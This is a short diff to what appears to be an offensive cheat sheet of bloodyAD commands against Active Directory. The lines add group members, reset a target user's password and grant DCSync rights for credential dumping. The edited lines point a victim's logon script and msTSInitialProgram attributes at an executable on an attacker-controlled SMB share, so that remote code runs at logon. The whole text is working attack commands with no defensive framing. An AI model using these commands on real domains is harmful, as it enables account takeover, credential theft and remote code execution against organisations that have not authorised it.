@@ -24,5 +24,5 @@ bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TARGET_USER" "$NEW_PASSWORD"
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get writable --detail
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$USER"
-bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" msTSInitialProgram -v "\\\\$LHOST\\share\\file.exe"
-bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" scriptPath -v "\\\\$LHOST\\share\\file.exe"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" msTSInitialProgram -v "\\\\$(fzf-ip)\\share\\file.exe"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" scriptPath -v "\\\\$(fzf-ip)\\share\\file.exe"
